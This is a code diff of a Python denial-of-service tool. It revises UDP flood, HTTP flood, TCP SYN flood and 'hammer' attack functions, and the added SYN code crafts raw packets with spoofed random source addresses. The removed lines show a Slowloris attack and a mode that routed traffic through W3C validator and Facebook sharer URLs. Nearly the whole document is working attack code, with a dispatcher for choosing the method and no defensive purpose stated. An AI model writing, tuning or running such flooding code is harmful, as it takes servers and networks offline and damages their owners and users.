@@ -10,36 +10,20 @@ from urllib.parse import urlparse
 import urllib3
 from queue import Queue
 
-# Disable warnings for cleaner output
+# Disable warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Global variables for enhanced attacks
+# Enhanced user agents
 USER_AGENTS = [
-    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
-    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
-    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
-    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
-    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
-    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
-    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
 ]
 
-# Bots for hammer attack
-HAMMER_BOTS = [
-    "http://validator.w3.org/check?uri=",
-    "http://www.facebook.com/sharer/sharer.php?u="
-]
-
-# Default headers for hammer attack
-HAMMER_HEADERS = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-us,en;q=0.5
-Accept-Encoding: gzip,deflate
-Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
-Keep-Alive: 115
-Connection: keep-alive"""
-
-# Thread management - optimized for performance without crashing
-MAX_THREADS = 500
+# Thread management
+MAX_THREADS = 300
 active_threads = threading.Semaphore(MAX_THREADS)
 
 def resolve_target(target):
@@ -49,143 +33,134 @@ def resolve_target(target):
         if ":" in target and not target.startswith("http"):
             parts = target.split(":")
             if len(parts) == 2:
-                return parts[0], int(parts[1])
+                ip = parts[0]
+                port = int(parts[1])
+                return ip, port
         
         # Parse URL if it starts with http/https
         if target.startswith("http"):
             parsed = urlparse(target)
             hostname = parsed.hostname
             port = parsed.port or (443 if parsed.scheme == "https" else 80)
-            return hostname, port
+            # Resolve hostname to IP
+            ip = socket.gethostbyname(hostname)
+            return ip, port
         else:
             # Assume it's a domain without scheme
             hostname = target
-            port = 80  # Default to port 80
-            return hostname, port
+            port = 80
+            ip = socket.gethostbyname(hostname)
+            return ip, port
     except Exception as e:
         raise ValueError(f"Could not resolve target: {target} - {str(e)}")
 
 def attack_udp_god(target, duration):
-    """Optimized UDP flood that won't crash your WiFi"""
+    """Optimized UDP flood that focuses on target"""
     ip, port = resolve_target(target)
     
-    threads_count = 150  # Balanced for effectiveness
-    packet_size = 1024   # Reasonable packet size
+    # Create a socket that won't affect local network as much
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(0)
     
-    def flood():
-        with active_threads:
-            end_time = time.time() + duration
-            
-            while time.time() < end_time:
-                try:
-                    # Use context manager to ensure socket cleanup
-                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-                        sock.settimeout(1)
-                        data = random._urandom(packet_size)
-                        
-                        # Send multiple packets but with controlled rate
-                        for _ in range(30):  # Reasonable packets per iteration
-                            if time.time() >= end_time:
-                                break
-                            sock.sendto(data, (ip, port))
-                            
-                        # Small delay to prevent network card overload
-                        time.sleep(0.05)
-                except Exception:
-                    # Brief pause on error to prevent rapid reconnection attempts
-                    time.sleep(0.1)
+    # Generate payload once to reduce CPU usage
+    payload = random._urandom(1400)  # MTU size
     
-    # Start threads
-    threads = []
-    for _ in range(threads_count):
-        t = threading.Thread(target=flood)
-        t.daemon = True
-        threads.append(t)
-        t.start()
+    end_time = time.time() + duration
     
-    # Wait for duration
-    time.sleep(duration)
-    for t in threads:
+    # Use a single thread with a tight loop instead of many threads
+    packets_sent = 0
+    while time.time() < end_time:
         try:
-            t.join(timeout=1.0)
+            # Send multiple packets in a burst
+            for _ in range(10):
+                sock.sendto(payload, (ip, port))
+                packets_sent += 1
+                
+            # Small delay to prevent complete network lock
+            time.sleep(0.001)
         except:
-            pass
+            # If there's an error, try to recreate the socket
+            try:
+                sock.close()
+            except:
+                pass
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.settimeout(0)
+            time.sleep(0.1)
+    
+    try:
+        sock.close()
+    except:
+        pass
+        
+    print(f"UDP attack completed. Sent {packets_sent} packets to {ip}:{port}")
 
 def attack_http_flood(target, duration):
-    """Effective HTTP flood that actually works"""
+    """More effective HTTP flood"""
     ip, port = resolve_target(target)
     use_ssl = port == 443
     
-    threads_count = 100  # Effective thread count
-    
-    # Enhanced headers and paths
-    paths = [
-        "/", "/wp-admin.php", "/admin/login", "/api/v1/users",
-        "/search", "/checkout", "/cart", "/product/123",
-        "/user/profile", "/ajax/search", "/graphql", "/wp-json/wp/v2/posts"
-    ]
-    
-    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
-    
-    def build_request(target_host):
-        method = random.choice(methods)
-        path = random.choice(paths)
+    # Generate requests once
+    requests_list = []
+    for _ in range(50):
+        method = random.choice(["GET", "POST", "HEAD"])
+        path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(5, 15)))
         
         headers = [
             f"{method} {path} HTTP/1.1",
-            f"Host: {target_host}",
+            f"Host: {ip}",
             f"User-Agent: {random.choice(USER_AGENTS)}",
-            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            f"Accept-Language: en-US,en;q=0.5",
-            f"Accept-Encoding: gzip, deflate, br",
-            f"Cache-Control: no-cache",
-            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
-            f"X-Real-IP: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}",
-            f"Connection: keep-alive",
-            f"Upgrade-Insecure-Requests: 1",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language: en-US,en;q=0.5",
+            "Accept-Encoding: gzip, deflate",
+            f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
+            "Connection: keep-alive",
         ]
         
         if method == "POST":
             headers.extend([
                 "Content-Type: application/x-www-form-urlencoded",
-                f"Content-Length: {random.randint(100, 500)}"
+                f"Content-Length: {random.randint(100, 2000)}"
             ])
         
-        return "\r\n".join(headers) + "\r\n\r\n"
+        requests_list.append("\r\n".join(headers) + "\r\n\r\n")
+    
+    end_time = time.time() + duration
     
     def flood():
         with active_threads:
-            end_time = time.time() + duration
-            
             while time.time() < end_time:
                 try:
-                    # Use context manager for proper socket cleanup
-                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-                        sock.settimeout(5)
+                    # Create a new socket for each request to avoid connection reuse
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(5)
+                    
+                    if use_ssl:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        ssock = context.wrap_socket(sock, server_hostname=ip)
+                        ssock.connect((ip, port))
+                        ssock.sendall(random.choice(requests_list).encode())
+                        ssock.close()
+                    else:
+                        sock.connect((ip, port))
+                        sock.sendall(random.choice(requests_list).encode())
+                        sock.close()
                         
-                        if use_ssl:
-                            context = ssl.create_default_context()
-                            context.check_hostname = False
-                            context.verify_mode = ssl.CERT_NONE
-                            with context.wrap_socket(sock, server_hostname=ip) as ssock:
-                                ssock.connect((ip, port))
-                                request = build_request(ip)
-                                ssock.sendall(request.encode())
-                        else:
-                            sock.connect((ip, port))
-                            request = build_request(ip)
-                            sock.sendall(request.encode())
-                            
-                        # Small delay between requests
-                        time.sleep(0.05)
-                            
-                except Exception:
-                    # Handle errors without affecting client
-                    time.sleep(0.1)
+                    # Small delay between requests
+                    time.sleep(0.01)
+                except Exception as e:
+                    # On error, just continue
+                    try:
+                        sock.close()
+                    except:
+                        pass
+                    time.sleep(0.05)
     
-    # Start threads
+    # Start a reasonable number of threads
     threads = []
-    for _ in range(threads_count):
+    for _ in range(50):
         t = threading.Thread(target=flood)
         t.daemon = True
         threads.append(t)
@@ -193,6 +168,8 @@ def attack_http_flood(target, duration):
     
     # Wait for duration
     time.sleep(duration)
+    
+    # Let threads finish
     for t in threads:
         try:
             t.join(timeout=1.0)
@@ -200,138 +177,191 @@ def attack_http_flood(target, duration):
             pass
 
 def attack_tcp_syn(target, duration):
-    """TCP SYN flood that actually works"""
+    """More effective TCP SYN flood"""
     ip, port = resolve_target(target)
     
-    threads_count = 80  # Effective thread count
+    # Create raw socket if possible
+    try:
+        # Try to create a raw socket (requires admin privileges on Windows)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    except:
+        # Fall back to regular sockets
+        sock = None
+    
+    end_time = time.time() + duration
     
     def syn_flood():
         with active_threads:
-            end_time = time.time() + duration
-            
             while time.time() < end_time:
                 try:
-                    # Use regular sockets instead of raw sockets for better compatibility
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(2)
-                    s.connect((ip, port))
-                    # Send some data to make it more effective
-                    s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
-                    time.sleep(0.1)
-                    s.close()
-                except:
-                    # If connection fails, just continue
-                    pass
-                
-                # Small delay to prevent overwhelming the system
-                time.sleep(0.01)
+                    if sock:  # Use raw socket if available
+                        # Craft TCP SYN packet
+                        source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+                        source_port = random.randint(1024, 65535)
+                        
+                        # IP header
+                        ip_ver = 4
+                        ip_ihl = 5
+                        ip_tos = 0
+                        ip_tot_len = 40  # IP header + TCP header
+                        ip_id = random.randint(1, 65535)
+                        ip_frag_off = 0
+                        ip_ttl = 255
+                        ip_proto = socket.IPPROTO_TCP
+                        ip_check = 0
+                        ip_saddr = socket.inet_aton(source_ip)
+                        ip_daddr = socket.inet_aton(ip)
+                        
+                        ip_header = struct.pack('!BBHHHBBH4s4s', 
+                                              (ip_ver << 4) + ip_ihl,
+                                              ip_tos,
+                                              ip_tot_len,
+                                              ip_id,
+                                              ip_frag_off,
+                                              ip_ttl,
+                                              ip_proto,
+                                              ip_check,
+                                              ip_saddr,
+                                              ip_daddr)
+                        
+                        # TCP header
+                        tcp_source = source_port
+                        tcp_dest = port
+                        tcp_seq = random.randint(0, 4294967295)
+                        tcp_ack_seq = 0
+                        tcp_doff = 5
+                        tcp_fin = 0
+                        tcp_syn = 1
+                        tcp_rst = 0
+                        tcp_psh = 0
+                        tcp_ack = 0
+                        tcp_urg = 0
+                        tcp_window = socket.htons(5840)
+                        tcp_check = 0
+                        tcp_urg_ptr = 0
+                        
+                        tcp_offset_res = (tcp_doff << 4)
+                        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
+                        
+                        tcp_header = struct.pack('!HHLLBBHHH', 
+                                               tcp_source, tcp_dest,
+                                               tcp_seq, tcp_ack_seq,
+                                               tcp_offset_res, tcp_flags,
+                                               tcp_window, tcp_check, tcp_urg_ptr)
+                        
+                        # Pseudo header for checksum
+                        source_address = socket.inet_aton(source_ip)
+                        dest_address = socket.inet_aton(ip)
+                        placeholder = 0
+                        protocol = socket.IPPROTO_TCP
+                        tcp_length = len(tcp_header)
+                        
+                        psh = struct.pack('!4s4sBBH', 
+                                         source_address, 
+                                         dest_address, 
+                                         placeholder, 
+                                         protocol, 
+                                         tcp_length)
+                        psh = psh + tcp_header
+                        
+                        # Calculate checksum
+                        tcp_check = checksum(psh)
+                        
+                        # Repack with correct checksum
+                        tcp_header = struct.pack('!HHLLBBHHH', 
+                                               tcp_source, tcp_dest,
+                                               tcp_seq, tcp_ack_seq,
+                                               tcp_offset_res, tcp_flags,
+                                               tcp_window, tcp_check, tcp_urg_ptr)
+                        
+                        # Send packet
+                        packet = ip_header + tcp_header
+                        sock.sendto(packet, (ip, 0))
+                    else:
+                        # Fallback to regular socket method
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.settimeout(1)
+                        try:
+                            s.connect((ip, port))
+                            s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
+                            time.sleep(0.01)
+                            s.close()
+                        except:
+                            pass
+                        
+                    # Small delay
+                    time.sleep(0.001)
+                except Exception as e:
+                    time.sleep(0.01)
     
     # Start threads
     threads = []
-    for _ in range(threads_count):
+    for _ in range(100 if sock else 50):  # More threads if using raw sockets
         t = threading.Thread(target=syn_flood)
         t.daemon = True
         threads.append(t)
         t.start()
     
     time.sleep(duration)
+    
+    # Clean up
+    if sock:
+        try:
+            sock.close()
+        except:
+            pass
+    
     for t in threads:
         try:
             t.join(timeout=1.0)
         except:
             pass
 
+def checksum(data):
+    """Calculate checksum for packets"""
+    if len(data) % 2 != 0:
+        data += b'\0'
+    
+    s = 0
+    for i in range(0, len(data), 2):
+        w = (data[i] << 8) + data[i+1]
+        s += w
+    
+    s = (s >> 16) + (s & 0xffff)
+    s = ~s & 0xffff
+    return s
+
 def attack_hammer(target, duration):
-    """Enhanced hammer attack based on the provided script"""
+    """Simplified but effective hammer attack"""
     ip, port = resolve_target(target)
     
-    # Thread count control
-    threads_count = min(135, MAX_THREADS // 2)  # Limit threads to prevent overload
-    
-    # Queues for tasks
-    q = Queue()
-    w = Queue()
-    
-    def bot_hammering(url, end_time):
-        """Hammer using bot URLs"""
-        with active_threads:
-            while time.time() < end_time:
-                try:
-                    req = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=5)
-                    time.sleep(0.1)
-                except:
-                    time.sleep(0.1)
-    
-    def down_it(end_time):
-        """Direct socket hammering"""
-        with active_threads:
-            while time.time() < end_time:
-                try:
-                    # Create a proper HTTP request
-                    packet = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n{HAMMER_HEADERS}\r\n\r\n".encode('utf-8')
-                    
-                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                        s.settimeout(3)
-                        s.connect((ip, port))
-                        s.send(packet)
-                        time.sleep(0.1)
-                except:
-                    time.sleep(0.1)
-    
-    def dos(end_time):
-        """Thread function for direct attack"""
-        while time.time() < end_time:
-            try:
-                item = q.get(timeout=1)
-                down_it(end_time)
-                q.task_done()
-            except:
-                pass
-    
-    def dos2(end_time):
-        """Thread function for bot attack"""
-        while time.time() < end_time:
-            try:
-                item = w.get(timeout=1)
-                bot_hammering(random.choice(HAMMER_BOTS) + "http://" + ip, end_time)
-                w.task_done()
-            except:
-                pass
+    # Generate request once
+    request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nAccept: */*\r\n\r\n".encode()
     
     end_time = time.time() + duration
+    
+    def hammer():
+        with active_threads:
+            while time.time() < end_time:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(3)
+                    s.connect((ip, port))
+                    s.send(request)
+                    time.sleep(0.1)
+                    s.close()
+                except:
+                    time.sleep(0.1)
     
     # Start threads
     threads = []
-    for i in range(threads_count):
-        t = threading.Thread(target=dos, args=(end_time,))
+    for _ in range(100):
+        t = threading.Thread(target=hammer)
         t.daemon = True
         threads.append(t)
         t.start()
-        
-        t2 = threading.Thread(target=dos2, args=(end_time,))
-        t2.daemon = True
-        threads.append(t2)
-        t2.start()
     
-    # Fill queues with tasks
-    item = 0
-    while time.time() < end_time:
-        if item > 1000:  # Prevent memory issues
-            item = 0
-            time.sleep(0.1)
-        item += 1
-        q.put(item)
-        w.put(item)
-    
-    # Wait for duration
     time.sleep(duration)
-    
-    # Clean up
-    try:
-        q.join()
-        w.join()
-    except:
-        pass
     
     for t in threads:
         try:
@@ -339,79 +369,12 @@ def attack_hammer(target, duration):
         except:
             pass
 
-def attack_slowloris(target, duration):
-    """Improved Slowloris attack that actually works"""
-    ip, port = resolve_target(target)
-    use_ssl = port == 443
-    
-    sockets_count = 150  # Effective socket count
-    sockets = []
-    
-    # Create initial sockets
-    for _ in range(sockets_count):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3)
-            
-            if use_ssl:
-                context = ssl.create_default_context()
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                s = context.wrap_socket(s, server_hostname=ip)
-            
-            s.connect((ip, port))
-            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
-            sockets.append(s)
-        except:
-            pass
-    
-    end_time = time.time() + duration
-    
-    # Keep connections alive
-    while time.time() < end_time and sockets:
-        for s in list(sockets):  # Use list copy to avoid modification during iteration
-            try:
-                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
-            except:
-                try:
-                    s.close()
-                    sockets.remove(s)
-                    # Try to create a new socket to replace the lost one
-                    try:
-                        new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        new_s.settimeout(3)
-                        
-                        if use_ssl:
-                            context = ssl.create_default_context()
-                            context.check_hostname = False
-                            context.verify_mode = ssl.CERT_NONE
-                            new_s = context.wrap_socket(new_s, server_hostname=ip)
-                        
-                        new_s.connect((ip, port))
-                        new_s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
-                        sockets.append(new_s)
-                    except:
-                        pass
-                except:
-                    pass
-        
-        # Reasonable interval
-        time.sleep(10)
-    
-    # Clean up
-    for s in sockets:
-        try:
-            s.close()
-        except:
-            pass
-
-# Attack dispatcher for easy calling
+# Attack dispatcher
 ATTACK_METHODS = {
-    "udp": attack_udp_god,
-    "http": attack_http_flood,
-    "syn": attack_tcp_syn,
+    "udp_god": attack_udp_god,
+    "http_flood": attack_http_flood,
+    "tcp_syn": attack_tcp_syn,
     "hammer": attack_hammer,
-    "slowloris": attack_slowloris,
 }
 
 def launch_attack(method, target, duration):
